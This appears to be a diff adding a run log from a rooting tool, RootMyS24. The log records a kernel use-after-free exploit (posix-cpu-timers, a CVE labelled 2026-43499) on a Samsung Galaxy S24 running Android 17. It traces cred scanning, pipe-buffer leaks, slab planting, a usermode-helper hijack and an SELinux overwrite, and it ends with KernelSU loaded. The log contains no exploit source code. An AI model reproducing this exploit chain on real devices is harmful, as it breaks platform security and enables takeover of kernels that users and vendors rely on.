@@ -1,0 +1,87 @@
+RootMyS24 v3.6.0-s24 (build 263)
+RUN-ID: 9ab1deb2-1794049974726
+引擎: SAMTIMER_98260 · 载荷: 98260 UAF · KSU: 32525 (ksud-32525)
+◆ Запуск RootMyS24
+◆ Полезная нагрузка: cve-2026-43499-S9280ZHU6EZIF (фиксированная, kmalloc_caches 0x16bad78)
+[1/5] Проверка Shizuku...
+✔ Shizuku готов
+◆ 设备: SM-S921E (pineapple)
+◆ 系统: Android 17 / 安全补丁 2026-09-05
+◆ 固件: S921EXXU3DZIF (bootloader S921EXXU3DZIF)
+◆ 指纹: samsung/e1qxins/e1q:17/CP2A.260605.016/S921EXXU3DZIF:user/release-keys
+◆ KNOX: 完好 (warranty_bit=0, verifiedbootstate=green)
+◆ 版本: RootMyS24 v3.6.0-s24 (build 263)
+◆ 引擎: 98260 UAF（posix-cpu-timers；实现参考 SamTimer v1.3，Shizuku UserService 常驻进程模式）
+✔ UserService 已连接（shell 就绪=true）
+◆ late-load 用 --ephemeral（同 43499）：不装 /data/adb、不跑 module stage、不重启管理器
+◆ late-load 驱动:  (samtimer/ksud-32525)
+◆ 启动 exploit（umhpipe，最多等 7 分钟）……
+shell context ok (uid=2000)
+staged libtimer=2213408 uhexec=2219832 action=699 ksud=4879856
+staged /data/local/tmp/.ksud-stage
+trace buffer set to 65536kB
+starting exploit (umhpipe)...
+[+] pid=8955 cpu=2
+[ids] page_alloc=264 page_free=262 pairs=1029
+[base-diag] made=512 timer_allocs(c)=512 order1_pfn(rn)=16 page_alloc_id=264
+[base] made=512 best=0xffffff7f80000000 count=484
+[child] alive, waiting for go
+  [credscan] cred=0xffffff803e7e5b40 site_low=0x185308 req=0xb0 alloc=0xc0 (n=0)
+  [credscan] cred=0xffffff884e6b4dd0 site_low=0x691d0 req=0xd0 alloc=0xd0 (n=1)
+  [credscan] cred=0xffffff88673e1450 site_low=0x691d0 req=0xd0 alloc=0xd0 (n=2)
+  [credscan] cred=0xffffff803e7e5600 site_low=0x185308 req=0xb0 alloc=0xc0 (n=3)
+  [credscan] cred=0xffffff803e7e5600 site_low=0x185308 req=0xb0 alloc=0xc0 (n=4)
+[cred] attempt=0 child=8961 R=0xffffff88673e1450 site_low=0x185308 recs=5 task=0xffffff880d3bddc0 task_recs=1
+[+] child=8961 cred=0xffffff88673e1450 target=0xffffff88673e1454
+[+] pipe avail after read=0
+[+] pipe avail after write2=1
+[+] piperead trace n=24576
+[pipeleak] info=0xffffff88e9c25540 site=0xffffffc0084512f4
+[pipeleak] bufs=0xffffff883959c400 alloc=0x400 site=0xffffffc0084513b4
+[+] pipe=0xffffff88e9c25540 fds=16397/16398
+[pipepfn] pfn=0xd27d3 order=0 idx=0
+[pipepfn] pfn=0x8b959c order=0 idx=1
+[pipepfn] pfn=0x92a677 order=0 idx=2
+[pipepfn] pfn=0xac75f order=0 idx=3
+[+] pipe user pfn=0xd27d3 recs=4
+[+] pipe target page=0xfffffffe0149f4c0
+[+] verify marker candidate 0 pfn=0xd27d3
+[+] plant1 base=0xffffff7f80000000 slabs=133 pfns=127 recs=4096 kept=4096
+[+] plant1 pipe page=0xffffff8828466000 node=0xffffff88284670f8 off=0 spage=0xfffffffe0149f4c0 ops=0xffffffc0092cad50
+[slab] pre-exec active=4867 total=4867
+[+] plant1 V=0xffffff8828467080 fake=0xffffff88284670f8 node=0xffffff88284670f8 pfn=0x8a8467 slab=0x8a8466 slide=0xa0000 recs=4096 slab_own=31/32 base=0xffffff7f80000000
+[+] plant1 target=8963 etid=8969 zombie code=2 status=9
+[+] plant1 free_seen=1 burst hit=1 after 84ms
+[+] plant1 reaped status=0x9 (reaped=1)
+[+] plant1 write mode=zero target=0xffffff88e9c255e8
+[+] marker candidate 0 read n=8 val=0x1122334455667788
+[+] marker pfn verified=0xd27d3
+[+] umh bootstrap plant pipe=0xffffff88e9c25540 page=0xffffff88e9c25000 off=0x5e8 mark=0x7557672000 markva=0xffffff80527d3000 pfn=0xd27d3
+[+] plant1 base=0xffffff7f80000000 slabs=133 pfns=126 recs=4096 kept=4096
+[+] plant1 pipe page=0xffffff88e8cf6000 node=0xffffff88e8cf7410 off=0x5e8 spage=0xfffffffe23a70940 ops=0xffffffc0092cad50
+[slab] pre-exec active=4867 total=4867
+[+] plant1 V=0xffffff88e8cf7398 fake=0xffffff88e8cf7410 node=0xffffff88e8cf7410 pfn=0x968cf7 slab=0x968cf6 slide=0xa0000 recs=4096 slab_own=31/32 base=0xffffff7f80000000
+[+] plant1 target=8980 etid=8987 zombie code=2 status=9
+[+] plant1 free_seen=0 burst hit=1 after 2ms
+[+] plant1 reaped status=0x9 (reaped=1)
+[+] plant1 write mode=zero target=0xffffff88e9c255e8
+[+] umh pipe->bufs=0xffffff80527d3000 write n=8 errno=0 orig=0xffffff883959c400
+[+] umh wq=0xffffff8001cf8800
+[+] umh pwq=0xffffff8800b0a700
+[+] umh pool=0xffffff80629f0000
+[+] umh pool busy t=0 next=0xffffff8839453e48 prev=0xffffff8839453e48 workers=7 idle=7
+[+] umh worklist next=0xffffff80629f0028 prev=0xffffff80629f0028 workers=7 idle=7
+[+] user_pipe_write addr=0xffffff802a5e2618 off=0x618 n=1 errno=0
+[+] umh selinux write n=1
+[+] user_pipe_write addr=0xffffff80629f0028 off=0x28 n=16 errno=0
+[+] umh user work=0xffffff80527d3100 entry=0xffffff80527d3108 data=0xffffff80527d3800 pwq=0xffffff80527d3a00 func=0xffffffc008173be0 wl=0xffffff80629f0028 write=16
+✔ KernelSU 模块已加载（32601 / 3.3.0 KDP）；UserService 常驻保持，exploit 留在 parked
+◆ 先别清后台/别关 App：parked 进程还在 UserService 里拿着页
+◆ 若随后出现软重启（黑屏/锁屏闪一下后回到桌面）：属正常，内核 uptime 不重置、KSU 模块仍在，root 有效
+KERNELSU_LIVE
+success; exploit left parked (do not force-stop)
+◆ UserService 结束：exit=0 ksu=true
+UMHPIPE_MISSING
+[+] user_pipe_write addr=0xffffff88e9c255e8 off=0x5e8 n=8 errno=0
+[+] umhpipe done; parking
+[!] umhpipe done -- parking without reap (zombie held)
